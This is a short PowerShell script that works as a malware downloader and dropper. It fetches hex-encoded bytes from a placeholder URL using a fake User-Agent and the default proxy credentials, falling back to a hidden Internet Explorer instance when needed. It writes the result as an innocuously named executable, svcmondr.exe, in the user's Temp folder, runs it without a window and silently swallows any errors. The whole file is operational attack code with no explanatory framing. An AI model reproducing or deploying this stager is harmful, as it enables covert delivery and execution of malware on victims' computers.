
	$URL = "URL"
    $webclient = New-Object System.Net.WebClient    
    $webclient.Headers.Add("User-Agent","Mozilla/4.0+")        
    $webclient.Proxy = [System.Net.WebRequest]::DefaultWebProxy
    $webclient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
    $ProxyAuth = $webclient.Proxy.IsBypassed($URL)
    if($ProxyAuth)
    {
        [string]$hexformat = $webClient.DownloadString($URL) 
    }
    else
    {
        $webClient = New-Object -ComObject InternetExplorer.Application
        $webClient.Visible = $false
        $webClient.Navigate($URL)
        while($webClient.ReadyState -ne 4) { Start-Sleep -Milliseconds 100 }
        [string]$hexformat = $webClient.Document.Body.innerText
        $webClient.Quit()
    }
    [Byte[]] $temp = $hexformat -split ' '
    [System.IO.File]::WriteAllBytes("$env:userprofile\AppData\Local\Temp\svcmondr.exe", $temp)
   
    try
     {
      
      Start-Process -NoNewWindow $env:userprofile\AppData\Local\Temp\svcmondr.exe
	  
       

}
catch [System.Exception] {

   
}
   

	